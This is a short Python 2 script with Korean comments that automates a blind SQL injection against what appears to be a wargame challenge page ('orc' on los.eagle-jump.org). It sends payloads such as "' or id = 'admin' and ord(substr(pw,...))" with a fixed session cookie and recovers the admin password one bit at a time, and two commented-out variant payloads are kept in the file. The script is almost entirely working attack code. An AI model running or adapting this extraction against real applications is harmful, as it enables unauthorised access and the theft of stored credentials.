#!/usr/bin/python
#-*- coding:utf-8 -*-
import urllib
import urllib2


def attack(count, bit):
    param = urllib.urlencode({"pw":"' or id = 'admin' and ord(substr(pw,%d,1))&%d = %d#" %(count,bit,bit)})
    #param = urllib.urlencode({"no":"1 or ord(id)<98 and ord(mid(pw,%d,1))&%d like %d" % (count,bit,bit)} ) // darknight
    #bugbig param = urllib.urlencode({"no":"1||(id)in(\"admin\")&&mid(pw,%d,1)in(\"%s\")"%(count,s)})    
    data = urllib.urlencode({'init':'init'})
    headers = {'Cookie':'PHPSESSID=4a1ppf2q1hjb47jum7bicnjtu3',   'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 6.1; ko; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 IPMS/A640400A-14D460801A1-000000426571'}
    req = urllib2.Request('http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?%s'%param, data, headers)
    read = urllib2.urlopen(req).read()
    return read

f_str = "<br><h2>Hello"
count = 1
   

while 1:
   #pow 2/7
    bit = pow(2, 7)
    count_false = 0
    str_num = 0
   
    while bit >= 1:
        result = attack(count, bit) # 결과 html 코드를 불러 옴 
        if(result.find(f_str)) != -1: # hello 문자열을 찾으면 str_num에 bit를 더하기 해줌
            str_num += bit
        else:
            count_false += 1 #  찾지 못하면 count_false에 1을 더함
        bit /= 2   # 비트를 2로 나누어 준다.
      
      
    if count_false >= 7: # count_false 가 7보다 커지게 되면 chr 
        exit(0)
      
    print chr(str_num),
    count += 1